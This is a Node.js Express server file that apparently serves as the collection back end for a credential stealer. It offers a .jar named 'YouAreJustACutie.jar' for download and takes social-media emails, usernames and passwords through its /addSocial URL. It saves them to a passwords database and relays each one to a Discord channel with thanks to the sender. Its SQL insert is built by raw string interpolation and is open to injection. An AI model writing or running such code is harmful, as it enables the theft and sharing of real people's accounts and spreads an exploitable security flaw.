import http from 'http';
import express from 'express';
import fs from 'fs';
import path from 'path';
import sqlite3 from 'sqlite3';
import execPhp from 'exec-php';
import { client, guild } from './discordBot/main.mjs';
import { EmbedBuilder } from 'discord.js';

const app = express();
const server = http.createServer(app);


const database = new sqlite3.Database("passwords.db", sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err && err.code == "SQLITE_CANTOPEN") {
        console.error("Can not create or open database");
        return;
    } else if (err) {
        console.error(`Can not create or open database : ${err.toString()}`);
    }
});


let createTables = fs.readFileSync("tablesCreation.sql", 'utf8');
database.exec(createTables, (err) => {
    if(err) {
        console.error(`Can not create tables : ${err.toString()}`);
        return;
    } else console.log("Database state updated.");
});



app.use(express.static('/public'));


app.get('/', (req, res) => {
    res.send('Hello World');
});

app.get('/download', (req, res) => {
    res.download("build/YouAreJustACutie.jar");
});

app.get('/wallpaper', (req, res) => {
    const files = fs.readdirSync(path.join('public'));
    const randomFile = files[Math.floor(Math.random() * files.length)];
    res.download(path.join('public', randomFile));
});

app.get('/social/:social', (req, res) => {
    switch(req.params.social) {
        case "Discord":
            res.download("socials/discord.png");
            break;
        case "Facebook":
            res.download("socials/facebook.png");
            break;
        case "Instagram":
            res.download("socials/instagram.jpg");
            break;
        case "Snapchat":
            res.download("socials/snapchat.jpg");
            break;
        case "Twitter":
            res.download("socials/twitter.jpg");
            break;
        case "Twitch":
            res.download("socials/twitch.png");
            break;
        case "Google":
            res.download("socials/google.png");
            break;
    }
});


app.get('/addSocial/:social/:email/:username/:password', (req, res) => {
    console.log(req.params);
    database.exec(`INSERT INTO accounts (social, email, username, password) VALUES ('${req.params.social}','${req.params.email}','${req.params.username}','${req.params.password}')`, (err) => {
        if(err) {
            console.error(`Can not insert data : ${err.toString()}`);
            return;
        } else console.log("Data inserted.");
    });

    const accountEmbed = new EmbedBuilder()
	.setColor(0x0099FF)
	.setTitle('A new account is shared')
	.setDescription('Someone decided to share this account :3')
	.setThumbnail(`http://5.135.74.201:1570/social/${req.params.social}`)
	.addFields(
		{ name: 'Social : ', value: req.params.social },
		{ name: '\u200B', value: '\u200B' },
		{ name: 'Username : ', value: req.params.username, inline: true },
		{ name: 'Email : ', value: req.params.email, inline: true },
        { name: 'Password : ', value: req.params.password, inline: true}
	)
	// .setImage('https://i.imgur.com/AfFp7pu.png')
	.setTimestamp()
	.setFooter({ text: 'Thank you cutie ❤' });

    const channel = guild.channels.cache.get('1228365375520116757');
    channel.send({ embeds: [accountEmbed] });
    res.send("Data inserted.");
});

app.get('/displaySocials', async (req, res) => {
    const phpFile = path.join('showSocials.php');

    const phpOutput = await execPhp(phpFile, (error, php, output) => {
        if(error) {
            console.error(`Can not execute php file : ${error.toString()}`);
            return;
        }
        res.send(output);
    });
});


server.listen(1570, () => {
    console.log(`Server running on port 1570`);
});